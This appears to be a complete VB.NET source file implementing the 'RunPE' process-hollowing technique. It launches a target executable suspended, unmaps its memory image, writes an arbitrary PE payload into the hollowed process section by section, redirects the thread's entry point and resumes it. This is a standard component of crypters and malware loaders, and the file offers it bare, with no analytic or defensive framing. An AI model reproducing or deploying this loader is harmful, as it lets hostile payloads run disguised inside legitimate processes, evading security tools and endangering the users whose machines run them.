Imports System.Runtime.InteropServices
Imports System.ComponentModel

Public Class rp
    Public Const PAGE_NOCACHE As Long = &H200
    Public Const PAGE_EXECUTE_READWRITE As Long = &H40
    Public Const PAGE_EXECUTE_WRITECOPY As Long = &H80
    Public Const PAGE_EXECUTE_READ As Long = &H20
    Public Const PAGE_EXECUTE As Long = &H10
    Public Const PAGE_WRITECOPY As Long = &H8
    Public Const PAGE_NOACCESS As Long = &H1
    Public Const PAGE_READWRITE As Long = &H4
    Public Const PAGE_READONLY As UInt32 = &H2

    Shared Sub MakeIt(ByVal data() As Byte, ByVal target As String)
        Dim C = New H.Context, SH As H.Section_Header, PI = New H.Process_Information, SI = New H.Startup_Information, PS = New H.Security_Flags, TS = New H.Security_Flags
        Dim GC = GCHandle.Alloc(data, GCHandleType.Pinned)
        Dim Buffer As Integer = GC.AddrOfPinnedObject.ToInt32
        Dim DH As New H.DOS_Header
        DH = Marshal.PtrToStructure(GC.AddrOfPinnedObject, DH.GetType)
        GC.Free()
        If H.CreateProcess(Nothing, target, PS, TS, False, 4, Nothing, Nothing, SI, PI) = 0 Then Return
        Dim NH As New H.NT_Headers
        NH = Marshal.PtrToStructure(New IntPtr(Buffer + DH.Address), NH.GetType)
        Dim Address, Offset As Long, ret As UInteger
        SI.CB = Len(SI)
        C.Flags = 65538
        If NH.Signature <> 17744 Or DH.Magic <> 23117 Then Return
        If H.GetThreadContext(PI.Thread, C) And H.ReadProcessMemory(PI.Process, C.Ebx + 8, Address, 4, 0) >= 0 And H.ZwUnmapViewOfSection(PI.Process, Address) >= 0 Then
            Dim ImageBase As UInt32 = H.VirtualAllocEx(PI.Process, NH.Optional.Image, NH.Optional.SImage, 12288, 4)
            If ImageBase <> 0 Then
                H.WriteProcessMemory(PI.Process, ImageBase, data, NH.Optional.SHeaders, ret)
                Offset = DH.Address + 248
                For I As Integer = 0 To NH.File.Sections - 1
                    SH = Marshal.PtrToStructure(New IntPtr(Buffer + Offset + I * 40), SH.GetType)
                    Dim Raw(SH.Size) As Byte
                    For Y As Integer = 0 To SH.Size - 1 : Raw(Y) = data(SH.Pointer + Y) : Next
                    H.WriteProcessMemory(PI.Process, ImageBase + SH.Address, Raw, SH.Size, ret)
                    H.VirtualProtectEx(PI.Process, ImageBase + SH.Address, SH.Misc.Size, Protect(SH.Flags), Address)
                Next I
                Dim T = BitConverter.GetBytes(ImageBase)
                H.WriteProcessMemory(PI.Process, C.Ebx + 8, T, 4, ret)
                C.Eax = ImageBase + NH.Optional.Address
                H.SetThreadContext(PI.Thread, C)
                H.ResumeThread(PI.Thread)
            End If
        End If
    End Sub

    Private Shared Function RShift(ByVal lValue As Long, ByVal lNumberOfBitsToShift As Long) As Long
        RShift = vbLongToULong(lValue) / (2 ^ lNumberOfBitsToShift)
    End Function
    Private Shared Function vbLongToULong(ByVal Value As Long) As Double
        Const OFFSET_4 = 4294967296.0#
        If Value < 0 Then
            vbLongToULong = Value + OFFSET_4
        Else
            vbLongToULong = Value
        End If
    End Function

    Private Shared Function Protect(ByVal characteristics As Long) As Long
        Dim mapping() As Object = {PAGE_NOACCESS, PAGE_EXECUTE, PAGE_READONLY, _
        PAGE_EXECUTE_READ, PAGE_READWRITE, PAGE_EXECUTE_READWRITE, _
        PAGE_READWRITE, PAGE_EXECUTE_READWRITE}
        Protect = mapping(RShift(characteristics, 29))
    End Function

    <EditorBrowsable(1)> Friend Class H
        <StructLayout(0)> Structure Context
            Dim Flags, D0, D1, D2, D3, D6, D7 As UInt32, Save As Save
            Dim SG, SF, SE, SD, Edi, Esi, Ebx, Edx, Ecx, Eax, Ebp, Eip, SC, EFlags, Esp, SS As UInt32
            <MarshalAs(UnmanagedType.ByValArray, SizeConst:=512)> Dim Registers As Byte()
        End Structure
        <StructLayout(0)> Structure Save
            Dim Control, Status, Tag, ErrorO, ErrorS, DataO, DataS As UInteger
            <MarshalAs(UnmanagedType.ByValArray, SizeConst:=80)> Dim RegisterArea As Byte()
            Dim State As UInt32
        End Structure
        Structure Misc
            Dim Address, Size As UInt32
        End Structure
        Structure Section_Header
            Dim Name As Byte, Misc As Misc, Address, Size, Pointer, PRelocations, PLines, NRelocations, NLines, Flags As UInt32
        End Structure
        Structure Process_Information
            Dim Process, Thread As IntPtr, ProcessId, ThreadId As Integer
        End Structure
        <StructLayout(0, CharSet:=3)> Structure Startup_Information
            Dim CB As Integer, ReservedA, Desktop, Title As String, X, Y, XSize, YSize, XCount, YCount, Fill, Flags As Integer
            Dim ShowWindow, ReservedB As Short, ReservedC, Input, Output, [Error] As Integer
        End Structure
        <StructLayout(0)> Structure Security_Flags
            Dim Length As Integer, Descriptor As IntPtr, Inherit As Integer
        End Structure
        <StructLayout(0)> Structure DOS_Header
            Dim Magic, Last, Pages, Relocations, Size, Minimum, Maximum, SS, SP, Checksum, IP, CS, Table, Overlay As UInt16
            <MarshalAs(UnmanagedType.ByValArray, SizeConst:=4)> Dim ReservedA As UInt16()
            Dim ID, Info As UInt16
            <MarshalAs(UnmanagedType.ByValArray, SizeConst:=10)> Dim ReservedB As UInt16()
            Dim Address As Int32
        End Structure
        Structure NT_Headers
            Dim Signature As UInt32, File As File_Header, [Optional] As Optional_Headers
        End Structure
        <StructLayout(0)> Structure File_Header
            Dim Machine, Sections As UInt16, Stamp, Table, Symbols As UInt32, Size, Flags As UInt16
        End Structure
        <StructLayout(0)> Structure Optional_Headers
            Public Magic As UInt16, Major, Minor As Byte, SCode, IData, UData, Address, Code, Data, Image As UInt32, SectionA, FileA As UInt32
            Public MajorO, MinorO, MajorI, MinorI, MajorS, MinorS As UInt16, Version, SImage, SHeaders, Checksum As UInt32, Subsystem, Flags As UInt16
            Public SSReserve, SSCommit, SHReserve, SHCommit, LFlags, Count As UInt32
            <MarshalAs(UnmanagedType.ByValArray, SizeConst:=16)> Public DataDirectory As Data_Directory()
        End Structure
        <StructLayout(0)> Structure Data_Directory
            Dim Address, Size As UInt32
        End Structure
        Declare Auto Function CreateProcess Lib "kernel32" (ByVal name As String, ByVal command As String, ByRef process As Security_Flags, ByRef thread As Security_Flags, ByVal inherit As Boolean, ByVal flags As UInt32, ByVal system As IntPtr, ByVal current As String, <[In]()> ByRef startup As Startup_Information, <Out()> ByRef info As Process_Information) As Boolean
        Declare Auto Function WriteProcessMemory Lib "kernel32" (ByVal process As IntPtr, ByVal address As IntPtr, ByVal buffer As Byte(), ByVal size As IntPtr, <Out()> ByRef written As Integer) As Boolean
        Declare Auto Function ReadProcessMemory Lib "kernel32" (ByVal process As IntPtr, ByVal address As IntPtr, ByRef buffer As IntPtr, ByVal size As IntPtr, ByRef read As Integer) As Integer
        Declare Auto Function VirtualProtectEx Lib "kernel32" (ByVal process As IntPtr, ByVal address As IntPtr, ByVal size As UIntPtr, ByVal [new] As UIntPtr, <Out()> ByVal old As UInt32) As Integer
        Declare Auto Function VirtualAllocEx Lib "kernel32" (ByVal process As IntPtr, ByVal address As IntPtr, ByVal size As UInt32, ByVal type As UInt32, ByVal protect As UInt32) As IntPtr
        Declare Auto Function ZwUnmapViewOfSection Lib "ntdll" (ByVal process As IntPtr, ByVal address As IntPtr) As Long
        Declare Auto Function ResumeThread Lib "kernel32" (ByVal thread As IntPtr) As UInt32
        Declare Auto Function GetThreadContext Lib "kernel32" (ByVal thread As IntPtr, ByRef context As Context) As Boolean
        Declare Auto Function SetThreadContext Lib "kernel32" (ByVal thread As IntPtr, ByRef context As Context) As Boolean
    End Class
End Class
